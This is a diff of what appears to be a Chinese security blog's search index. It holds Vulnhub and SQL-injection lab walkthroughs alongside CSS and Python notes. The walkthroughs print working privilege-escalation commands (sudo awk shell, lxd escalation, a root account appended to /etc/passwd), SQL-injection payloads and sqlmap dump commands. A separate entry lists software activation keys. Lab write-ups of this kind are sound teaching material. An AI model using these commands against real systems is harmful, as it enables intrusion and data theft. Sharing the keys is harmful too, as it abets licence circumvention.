-<p>经过检查发现有一个web用户，使用su切换到web用户，密码就是wordpress的登录密码<br><img src="https://img.xpctf.cn/img/20200925175346.png-xpctf" alt=""><br>因为反弹的shell不是交互式终端，使用python模拟交互式终端：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://img.xpctf.cn/img/20200925175546.png-xpctf" alt=""></p>
-<p>输入sudo -l发现拥有免密码以root身份执行awk命令，使用<code>sudo /usr/bin/awk &#39;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code>即可提权成功。<br><img src="https://img.xpctf.cn/img/20200925175814.png-xpctf" alt=""></p>
+    <title>Web代码审计常见函数</title>
+    <url>/posts/fbe3/</url>
+    <content><![CDATA[<p><strong>代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。 软件代码审计是对编程项目中源代码的全面分析，旨在发现错误，安全漏洞或违反编程约定。 它是防御性编程范例的一个组成部分，它试图在软件发布之前减少错误。</strong></p>
+<ul>
+<li>require ‘flag.php’        #文件包含函数(高)</li>
+<li>count($value)           #获取数组成员数(低)</li>
+<li>chr($value)               #转ascii<br><img src="https://img.xpctf.cn/img/20200604095334.png" alt="PHP会对$value进行256的mod运算，取余"></li>
+<li>unset($value)             #销毁变量</li>
+<li>intval($value)                #转整数<br><img src="https://img.xpctf.cn/img/20200604101527.png" alt="PHP5 无法处理16进制字符串"><ul>
+<li>ereg(表达式,字符串,regs)<br>ereg函数是php4-5的正则匹配函数，如果没有找到匹配或出错则返回 FALSE。如果没有传递入可选参数 regs 或者所匹配的字符串长度为 0，则本函数返回 1。ereg函数在php7中已弃用，存在%00截断漏洞。</li>
+</ul>
+</li>
+<li>is_numeric($value)        #判断是否为数字或者数字字符串，bool型</li>
+<li>empty                #判断一个变量是否被认为是空的。当一个变量并不存在，或者它的值等同于FALSE，那么它会被认为不存在。如果变量不存在的话，empty()并不会产生警告。bool型</li>
+<li>preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) : int<br>preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</li>
+<li>json_encode — 对变量进行 JSON 编码<br>这个编码不是值把json格式的编码，是把其他格式的编码成json，和json_decode没关系。</li>
+<li>json_decode — 对 JSON 格式的字符串进行解码<br>这个解密是指识别json格式的字符串，不和base64那种一个编码一个解密一样，和json_encode没关系。</li>
+<li>strcmp — 二进制安全字符串比较<br>比较两个字符串，如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</li>
+<li>eregi — 不区分大小写的正则表达式匹配<br>本函数和 ereg() 完全相同，只除了在匹配字母字符时忽略大小写的区别。</li>
+<li>strpos — 查找字符串首次出现的位置<br>完全匹配返回0，不完全匹配返回首次出现的位置；匹配失败返回flase</li>
+</ul>
 ]]></content>
       <categories>
-        <category>vulnhub</category>
+        <category>Web</category>
       </categories>
       <tags>
-        <tag>Writeup</tag>
+        <tag>CTF</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
     <title>funbox: rookie Writeup</title>
     <url>/posts/d826/</url>
     <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机IP：192.168.10.57<br>Kali：192.168.10.12</p>
-<p>先使用nmap扫描：<code>nmap -T4 -v -p- -A -oA nmap 192.168.10.57</code><br>开放端口：21 22 80<br>习惯性dirb发现一个logs，访问是404，看到ftp能匿名访问，登录发现类似用户名的压缩包，全部get到本地。<br><img src="https://img.xpctf.cn/img/20200922112115.png-xpctf" alt=""></p>
-<h2 id="压缩包破解"><a href="#压缩包破解" class="headerlink" title="压缩包破解"></a>压缩包破解</h2><p>下载后先阅读.@admins、.@users、welcome.msg。发现.@admins类似base64<br><img src="https://img.xpctf.cn/img/20200922112246.png-xpctf" alt=""><br>使用<code>echo &#39;SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290&#39; |base64 -d</code>解密后发现没什么东西，和.@users类似。<br><img src="https://img.xpctf.cn/img/20200922112420.png-xpctf" alt=""><br>还发现压缩包大小都是一样的，使用zip2john取出全部压缩包的hash：<code>zip2john *.zip &gt;&gt; hash</code><br><img src="https://img.xpctf.cn/img/20200922112628.png-xpctf" alt=""><br>然后使用john破解hash：<code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code><br>破解出两个密码，使用密码解压对应的文件<br><img src="https://img.xpctf.cn/img/20200922113027.png-xpctf" alt=""></p>
-<h2 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h2><p>使用解压的密钥登录tom账号，tab不能补全命令，发现rbash限制用户执行的命令，使用bash -i即可绕过。<br><img src="https://img.xpctf.cn/img/20200922113329.png-xpctf" alt=""><br>输入id后发现tom在lxd组，可以使用lxd提权。<br><img src="https://img.xpctf.cn/img/20200922113618.png-xpctf" alt=""></p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>把之前编译的lxd提权包下载到本地，使用脚本即可提权成功。<br><img src="https://img.xpctf.cn/img/20200922113923.png-xpctf" alt=""><br>由于现在是在容器里面读取，如果需要完美的进入宿主机器，可以在passwd文件写一个账号<br>生成一个密码：<code>openssl passwd -1 admin</code><br><img src="https://img.xpctf.cn/img/20200922115141.png-xpctf" alt=""><br>构造一个用户名：<code>rOOt:$1$Y6W9y42e$RbrNLaswviyaMulMUNTK6/:0:0:root:/root:/bin/bash</code><br>追加写入到passwd : <code>echo &#39;rOOt:$1$Y6W9y42e$RbrNLaswviyaMulMUNTK6/:0:0:root:/root:/bin/bash&#39; &gt;&gt; /mnt/root/etc/passwd</code><br>退出容器，切换到rOOt用户，密码admin，即可完美提权。<br><img src="https://img.xpctf.cn/img/20200922114958.png-xpctf" alt=""><br>alpine包编译：<a href="https://www.xpctf.cn/posts/3bac/#lxd%E5%92%8Clxc%E6%8F%90%E6%9D%83">https://www.xpctf.cn/posts/3bac/#lxd%E5%92%8Clxc%E6%8F%90%E6%9D%83</a></p>
+<p>先使用nmap扫描：<code>nmap -T4 -v -p- -A -oA nmap 192.168.10.57</code><br>开放端口：21 22 80<br>习惯性dirb发现一个logs，访问是404，看到ftp能匿名访问，登录发现类似用户名的压缩包，全部get到本地。<br><img src="https://img.xpctf.cn/img/20200922112115.png" alt=""></p>
+<h2 id="压缩包破解"><a href="#压缩包破解" class="headerlink" title="压缩包破解"></a>压缩包破解</h2><p>下载后先阅读.@admins、.@users、welcome.msg。发现.@admins类似base64<br><img src="https://img.xpctf.cn/img/20200922112246.png" alt=""><br>使用<code>echo &#39;SGkgQWRtaW5zLAoKYmUgY2FyZWZ1bGwgd2l0aCB5b3VyIGtleXMuIEZpbmQgdGhlbSBpbiAleW91cm5hbWUlLnppcC4KVGhlIHBhc3N3b3JkcyBhcmUgdGhlIG9sZCBvbmVzLgoKUmVnYXJkcwpyb290&#39; |base64 -d</code>解密后发现没什么东西，和.@users类似。<br><img src="https://img.xpctf.cn/img/20200922112420.png" alt=""><br>还发现压缩包大小都是一样的，使用zip2john取出全部压缩包的hash：<code>zip2john *.zip &gt;&gt; hash</code><br><img src="https://img.xpctf.cn/img/20200922112628.png" alt=""><br>然后使用john破解hash：<code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code><br>破解出两个密码，使用密码解压对应的文件<br><img src="https://img.xpctf.cn/img/20200922113027.png" alt=""></p>
+<h2 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h2><p>使用解压的密钥登录tom账号，tab不能补全命令，发现rbash限制用户执行的命令，使用bash -i即可绕过。<br><img src="https://img.xpctf.cn/img/20200922113329.png" alt=""><br>输入id后发现tom在lxd组，可以使用lxd提权。<br><img src="https://img.xpctf.cn/img/20200922113618.png" alt=""></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>把之前编译的lxd提权包下载到本地，使用脚本即可提权成功。<br><img src="https://img.xpctf.cn/img/20200922113923.png" alt=""><br>由于现在是在容器里面读取，如果需要完美的进入宿主机器，可以在passwd文件写一个账号<br>生成一个密码：<code>openssl passwd -1 admin</code><br><img src="https://img.xpctf.cn/img/20200922115141.png" alt=""><br>构造一个用户名：<code>rOOt:$1$Y6W9y42e$RbrNLaswviyaMulMUNTK6/:0:0:root:/root:/bin/bash</code><br>追加写入到passwd : <code>echo &#39;rOOt:$1$Y6W9y42e$RbrNLaswviyaMulMUNTK6/:0:0:root:/root:/bin/bash&#39; &gt;&gt; /mnt/root/etc/passwd</code><br>退出容器，切换到rOOt用户，密码admin，即可完美提权。<br><img src="https://img.xpctf.cn/img/20200922114958.png" alt=""><br>alpine包编译：<a href="https://www.xpctf.cn/posts/3bac/#lxd%E5%92%8Clxc%E6%8F%90%E6%9D%83">https://www.xpctf.cn/posts/3bac/#lxd%E5%92%8Clxc%E6%8F%90%E6%9D%83</a></p>
 ]]></content>
       <categories>
         <category>vulnhub</category>
@@ -1234,6 +1217,23 @@
       <tags>
         <tag>Writeup</tag>
         <tag>funbox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hacknos:os-hax writeup</title>
+    <url>/posts/e09f/</url>
+    <content><![CDATA[<p>通过<code>rp-scan -l</code>命令发现靶机IP，对靶机进行靶机扫描：<code>nmap -A -v -p- -oA nmap 192.168.10.61</code>，开放两个端口<br><img src="https://img.xpctf.cn/img/20200925173410.png" alt=""><br>对80进行目录扫描，发现wordpress目录，直接访问wp-admin发现重定向到localhost；嗯？这是搞什么飞机，修改localhost指向靶机IP，wpscan扫描发现一个web用户，爆破失败；没有发现插件和主题漏洞。注意：需要注释掉第一行才能生效<br><img src="https://img.xpctf.cn/img/20200925174009.png" alt=""><br>网站根目录像个cms，继续进行扫描，刚刚出现wp目录就停止了，后来发现了个img目录的文件很有意思，打开是一张hosts截图，应该是叫我们修改本地hosts。<br><img src="https://img.xpctf.cn/img/20200925173720.png" alt=""><br>现在到本地使用exiftool分析图片，发现一个passw@45关键词，尝试wordpress登录和ssh登录，都失败了。<br><img src="https://img.xpctf.cn/img/20200925174249.png" alt=""><br>后来通过加入字典扫描发现是一个目录，拿到flag2.txt。<br><img src="https://img.xpctf.cn/img/20200925174458.png" alt=""></p>
+<p>打开后是一段密文，有点熟悉，但不知道叫什么，通过百度”ctf加密算法”关键字找到文章发现是brainfuck加密，解密后得到web用户密码，登录wordpress后修改主题404页面拿到webshell。<br>但是构造路径有点麻烦，这里打出来方便以后用：<a href="http://localhost/wordpress/wp-content/themes/twentysixteen/404.php">http://localhost/wordpress/wp-content/themes/twentysixteen/404.php</a></p>
+<p>CTF密码学常见加解密总结：<a href="https://blog.csdn.net/qq_40836553/article/details/79383488">https://blog.csdn.net/qq_40836553/article/details/79383488</a></p>
+<p>还有一个插件可以命令执行拿shell。<br><img src="https://img.xpctf.cn/img/20200925175155.png" alt=""></p>
+<p>经过检查发现有一个web用户，使用su切换到web用户，密码就是wordpress的登录密码<br><img src="https://img.xpctf.cn/img/20200925175346.png" alt=""><br>因为反弹的shell不是交互式终端，使用python模拟交互式终端：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://img.xpctf.cn/img/20200925175546.png" alt=""></p>
+<p>输入sudo -l发现拥有免密码以root身份执行awk命令，使用<code>sudo /usr/bin/awk &#39;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code>即可提权成功。<br><img src="https://img.xpctf.cn/img/20200925175814.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Writeup</tag>
       </tags>
   </entry>
   <entry>
@@ -1257,6 +1257,20 @@
       </tags>
   </entry>
   <entry>
+    <title>python进制转换</title>
+    <url>/posts/915b/</url>
+    <content><![CDATA[<h2 id="表示方法"><a href="#表示方法" class="headerlink" title="表示方法"></a>表示方法</h2><p>二进制：0b开头<br>八进制：0o开头<br>十进制：无前缀<br>十六进制：0x开头</p>
+<h2 id="十进制转"><a href="#十进制转" class="headerlink" title="十进制转"></a>十进制转</h2><p>十进制转二进制：bin(3)  =&gt;  ‘0b11’<br>十进制转八进制：oct(9)  =&gt;  ‘0o11’<br>十进制转十六进制：hex(11)  =&gt;  ‘0xb’</p>
+<h2 id="转十进制"><a href="#转十进制" class="headerlink" title="转十进制"></a>转十进制</h2><p>二进制转十进制：0b11  =&gt;  3<br>八进制转十进制：0o11  =&gt;  9<br>十六进制转十进制：0xb  =&gt; 11</p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>进制转换</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>html+css前端学习</title>
     <url>/posts/1d9/</url>
     <content><![CDATA[<h2 id="Emmet语法"><a href="#Emmet语法" class="headerlink" title="Emmet语法"></a>Emmet语法</h2><h3 id="Emmet是什么"><a href="#Emmet是什么" class="headerlink" title="Emmet是什么"></a>Emmet是什么</h3><p>Emmet语法的前身是Zen coding，它使用缩写来提供html/css的编写速度，vscode内部已经集成了改语法。</p>
@@ -1265,7 +1279,7 @@
 <h3 id="格式化代码"><a href="#格式化代码" class="headerlink" title="格式化代码"></a>格式化代码</h3><p>vscode中提供了标准html+css语法的格式化功能，快捷键Shift+Alt+F，或者右键选择格式化文档。<br>修改vscode配置文件实现保存时自动格式化，打开设置搜索”emmet”，选择”在setings.json中编辑”，添加如下内容</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;editor.formatOnType&quot;</span>:<span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;editor.formatOnSave&quot;</span>:<span class="literal">true</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img.xpctf.cn/img/20200917134850.png-xpctf" alt=""></p>
+<p><img src="https://img.xpctf.cn/img/20200917134850.png" alt=""></p>
 <h2 id="CSS复合选择器"><a href="#CSS复合选择器" class="headerlink" title="CSS复合选择器"></a>CSS复合选择器</h2><h3 id="复合选择器是什么"><a href="#复合选择器是什么" class="headerlink" title="复合选择器是什么"></a>复合选择器是什么</h3><p>在CSS中，可以根据选择器的类型把选择器分为基础选择器和复合选择器，复合选择器是建立在基础选择器之上的，对基本选择器进行组合形成的。</p>
 <ul>
 <li>复合选择器可以更精准、更高效的选择目标元素(标签)</li>
@@ -1288,7 +1302,7 @@
 <h4 id="focus伪类型选择器"><a href="#focus伪类型选择器" class="headerlink" title=":focus伪类型选择器"></a>:focus伪类型选择器</h4><p>:focus伪类选择器可以用来获得焦点的表单元素，焦点就是光标，一般情况&lt;input&gt;类表单元素才能获取，因此这个选择器也主要针对于表单元素来说。</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">input</span><span class="selector-pseudo">:focus</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="CSS的元素显示模式"><a href="#CSS的元素显示模式" class="headerlink" title="CSS的元素显示模式"></a>CSS的元素显示模式</h2><h3 id="元素显示模式是什么"><a href="#元素显示模式是什么" class="headerlink" title="元素显示模式是什么"></a>元素显示模式是什么</h3><p><img src="https://img.xpctf.cn/img/20200917184549.png-xpctf" alt=""></p>
+<h2 id="CSS的元素显示模式"><a href="#CSS的元素显示模式" class="headerlink" title="CSS的元素显示模式"></a>CSS的元素显示模式</h2><h3 id="元素显示模式是什么"><a href="#元素显示模式是什么" class="headerlink" title="元素显示模式是什么"></a>元素显示模式是什么</h3><p><img src="https://img.xpctf.cn/img/20200917184549.png" alt=""></p>
 <h3 id="块元素"><a href="#块元素" class="headerlink" title="块元素"></a>块元素</h3><p>常用的块元素有&lt;h1&gt;~&lt;h2&gt;、&lt;p&gt;、&lt;div&gt;、&lt;ul&gt;、&lt;ol&gt;、&lt;li&gt;等，其中&lt;div&gt;标签是最典型的块元素。<br>块元素的特点：</p>
 <ul>
 <li>独占一行</li>
@@ -1313,7 +1327,7 @@
 <li>链接里面不能再放链接</li>
 <li>链接里面可以放块元素</li>
 </ul>
-<h3 id="行内块元素"><a href="#行内块元素" class="headerlink" title="行内块元素"></a>行内块元素</h3><p>在行内元素中有几个特殊的标签：&lt;img /&gt;、&lt;input /&gt;、&lt;td&gt;,它们同时具有块元素和行内元素的特点，有些地方称它们为行内块元素。<br><img src="https://img.xpctf.cn/img/20200917195209.png-xpctf" alt=""></p>
+<h3 id="行内块元素"><a href="#行内块元素" class="headerlink" title="行内块元素"></a>行内块元素</h3><p>在行内元素中有几个特殊的标签：&lt;img /&gt;、&lt;input /&gt;、&lt;td&gt;,它们同时具有块元素和行内元素的特点，有些地方称它们为行内块元素。<br><img src="https://img.xpctf.cn/img/20200917195209.png" alt=""></p>
 <h3 id="元素显示模式转换"><a href="#元素显示模式转换" class="headerlink" title="元素显示模式转换"></a>元素显示模式转换</h3><p>特殊情况下，我们需要元素模式的转换，简单理解：一个模式的元素需要另一种模式的特性。比如a标签需要增加触发范围。</p>
 <p>转换为块级元素：display:block；</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>学习不是一两天的事<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -1400,7 +1414,7 @@
 <td align="center">无穷大</td>
 </tr>
 </tbody></table>
-<h2 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h2><h3 id="盒子模型组成"><a href="#盒子模型组成" class="headerlink" title="盒子模型组成"></a>盒子模型组成</h3><p>盒子模型：就是把HTML页面中的布局元素看作是一个矩形的盒子，也就是一个盛装内容的容器。CSS盒子模型本质是一个盒子，封装周围的HTML元素，它包括：边框、外边距、内边距和实际内容。<br><img src="https://img.xpctf.cn/img/20200920201049.png-xpctf" alt=""></p>
+<h2 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h2><h3 id="盒子模型组成"><a href="#盒子模型组成" class="headerlink" title="盒子模型组成"></a>盒子模型组成</h3><p>盒子模型：就是把HTML页面中的布局元素看作是一个矩形的盒子，也就是一个盛装内容的容器。CSS盒子模型本质是一个盒子，封装周围的HTML元素，它包括：边框、外边距、内边距和实际内容。<br><img src="https://img.xpctf.cn/img/20200920201049.png" alt=""></p>
 <h3 id="边框（border）"><a href="#边框（border）" class="headerlink" title="边框（border）"></a>边框（border）</h3><p>borber可以设置元素的边框，边框又三部分组成：边框宽度(粗细)边框样式和边框颜色。</p>
 <blockquote>
 <p>border: borber-width borber-style borber-color    全<br>border-top: borber-width borber-style borber-color    上<br>border-bottom: borber-width borber-style borber-color    下<br>border-left: borber-width borber-style borber-color    左<br>border-right: borber-width borber-style borber-color    右</p>
@@ -1415,20 +1429,6 @@
       </categories>
       <tags>
         <tag>前端</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python进制转换</title>
-    <url>/posts/915b/</url>
-    <content><![CDATA[<h2 id="表示方法"><a href="#表示方法" class="headerlink" title="表示方法"></a>表示方法</h2><p>二进制：0b开头<br>八进制：0o开头<br>十进制：无前缀<br>十六进制：0x开头</p>
-<h2 id="十进制转"><a href="#十进制转" class="headerlink" title="十进制转"></a>十进制转</h2><p>十进制转二进制：bin(3)  =&gt;  ‘0b11’<br>十进制转八进制：oct(9)  =&gt;  ‘0o11’<br>十进制转十六进制：hex(11)  =&gt;  ‘0xb’</p>
-<h2 id="转十进制"><a href="#转十进制" class="headerlink" title="转十进制"></a>转十进制</h2><p>二进制转十进制：0b11  =&gt;  3<br>八进制转十进制：0o11  =&gt;  9<br>十六进制转十进制：0xb  =&gt; 11</p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>进制转换</tag>
       </tags>
   </entry>
   <entry>
@@ -1495,7 +1495,7 @@
 <p><img src="https://img.xpctf.cn/img/20200902175450.png" alt=""></p>
 <p>5、删除服务</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sc delete mysql</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.xpctf.cn/img/20200902175855.png-xpctf" alt=""></p>
+<p><img src="https://img.xpctf.cn/img/20200902175855.png" alt=""></p>
 ]]></content>
       <categories>
         <category>windows</category>
@@ -1613,6 +1613,23 @@
       </tags>
   </entry>
   <entry>
+    <title>各种激活序列号</title>
+    <url>/posts/873b/</url>
+    <content><![CDATA[<blockquote>
+<p>自己在找激活码的时候找的特别痛苦，现在写个笔记比较避免下次使用重找。</p>
+</blockquote>
+<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p>cn_win_srv_2003_r2_enterprise_x64_with_sp2_vl_cd1：RYCR6-T7Y6M-2TVHK-C2YW3-7TYQ8</p>
+<p>cn_win_srv_2003_r2_enterprise_with_sp2_vl_cd1：DGT8M-XVFW2-BDMQB-7YDX3-M374W</p>
+<h2 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a>应用程序</h2><p>VMware16激活密钥：ZF3R0-FHED2-M80TY-8QYGC-NPKYF</p>
+]]></content>
+      <categories>
+        <category>分享</category>
+      </categories>
+      <tags>
+        <tag>序列号</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>信息安全不需要视力</title>
     <url>/posts/9a39/</url>
     <content><![CDATA[<blockquote>
@@ -1647,20 +1664,19 @@
       </tags>
   </entry>
   <entry>
-    <title>各种激活序列号</title>
-    <url>/posts/873b/</url>
-    <content><![CDATA[<blockquote>
-<p>自己在找激活码的时候找的特别痛苦，现在写个笔记比较避免下次使用重找。</p>
-</blockquote>
-<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p>cn_win_srv_2003_r2_enterprise_x64_with_sp2_vl_cd1：RYCR6-T7Y6M-2TVHK-C2YW3-7TYQ8</p>
-<p>cn_win_srv_2003_r2_enterprise_with_sp2_vl_cd1：DGT8M-XVFW2-BDMQB-7YDX3-M374W</p>
-<h2 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a>应用程序</h2><p>VMware16激活密钥：ZF3R0-FHED2-M80TY-8QYGC-NPKYF</p>
+    <title>易锦靶场新手区SQL注入</title>
+    <url>/posts/2f9a/</url>
+    <content><![CDATA[<h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><p>通过群里讲师得到，id=95存在注入，其他不存在，我试了一下也是不存在。<br><a href="http://lab.yijincc.com:50006/?m=home&c=View&a=index&aid=95">http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95</a></p>
+<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><p>通过id初步判断时数字型注入，输入95 and 1=1,页面无异常<br><img src="https://img.xpctf.cn/img/20200701211641.png" alt=""><br>输入95 and 1=2页面不存在，说明存在数字型注入<br><img src="https://img.xpctf.cn/img/20200701211818.png" alt=""></p>
+<h2 id="获取返回列"><a href="#获取返回列" class="headerlink" title="获取返回列"></a>获取返回列</h2><p>经过测试发现order by 48回显正常(我的天48个)，union联合查询获取回显位置，payload：<code>95 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48</code><br><img src="https://img.xpctf.cn/img/20200701212420.png" alt=""><br>回显不是我们期待的，考虑过滤了union，使用异或测试union。<code>95^(length(&#39;union&#39;)=5)</code><br><img src="https://img.xpctf.cn/img/20200701212657.png" alt=""><br>如果未被过滤，最后运算结果应该是95，异或注入回显一致说明没有被过滤，但返回的不是aid为95的页面，是aid为94的页面，后来我发现没改aid，改成-95<br><img src="https://img.xpctf.cn/img/20200701212521.png" alt=""><br>改为95就404了，可能是过滤了select之类的，使用异或测试都没有被过滤。联想到一开始得到的结论 只有aid为95猜存在注入<br><img src="https://img.xpctf.cn/img/20200702084506.png" alt=""><br>后来我删了一个列，发现了报错注入，尝试了extractvalue报错注入无果<br><img src="https://img.xpctf.cn/img/20200702084931.png" alt=""><br>后来使用 floor注入发现成功了，payload：<code>and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x) a)</code><br><img src="https://img.xpctf.cn/img/20200702085136.png" alt=""></p>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>昨晚找到floor报错注入，今天又用了sqlmap来跑，通过指定参数来爆破<br>语句：py -3 sqlmap.py -u “<a href="http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95&quot;">http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95&quot;</a> -p aid –batch<br>跑了一会发现三种注入方式，分别是布尔盲注，报错注入，时间盲注。<br><img src="https://img.xpctf.cn/img/20200702085619.png" alt=""><br>因为这是靶场，接下来就是脱库了，sqlmap比自己写脚本来的快，<br>语句：py -3 sqlmap.py -u “<a href="http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95&quot;">http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95&quot;</a> -p aid –dump-all –batch</p>
+<p><strong>测试结束</strong></p>
 ]]></content>
       <categories>
-        <category>分享</category>
+        <category>Web</category>
       </categories>
       <tags>
-        <tag>序列号</tag>
+        <tag>SQL实战</tag>
       </tags>
   </entry>
   <entry>
@@ -1683,22 +1699,6 @@
       <tags>
         <tag>笔记</tag>
         <tag>LAMP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>易锦靶场新手区SQL注入</title>
-    <url>/posts/2f9a/</url>
-    <content><![CDATA[<h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><p>通过群里讲师得到，id=95存在注入，其他不存在，我试了一下也是不存在。<br><a href="http://lab.yijincc.com:50006/?m=home&c=View&a=index&aid=95">http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95</a></p>
-<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><p>通过id初步判断时数字型注入，输入95 and 1=1,页面无异常<br><img src="https://img.xpctf.cn/img/20200701211641.png" alt=""><br>输入95 and 1=2页面不存在，说明存在数字型注入<br><img src="https://img.xpctf.cn/img/20200701211818.png" alt=""></p>
-<h2 id="获取返回列"><a href="#获取返回列" class="headerlink" title="获取返回列"></a>获取返回列</h2><p>经过测试发现order by 48回显正常(我的天48个)，union联合查询获取回显位置，payload：<code>95 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48</code><br><img src="https://img.xpctf.cn/img/20200701212420.png" alt=""><br>回显不是我们期待的，考虑过滤了union，使用异或测试union。<code>95^(length(&#39;union&#39;)=5)</code><br><img src="https://img.xpctf.cn/img/20200701212657.png" alt=""><br>如果未被过滤，最后运算结果应该是95，异或注入回显一致说明没有被过滤，但返回的不是aid为95的页面，是aid为94的页面，后来我发现没改aid，改成-95<br><img src="https://img.xpctf.cn/img/20200701212521.png" alt=""><br>改为95就404了，可能是过滤了select之类的，使用异或测试都没有被过滤。联想到一开始得到的结论 只有aid为95猜存在注入<br><img 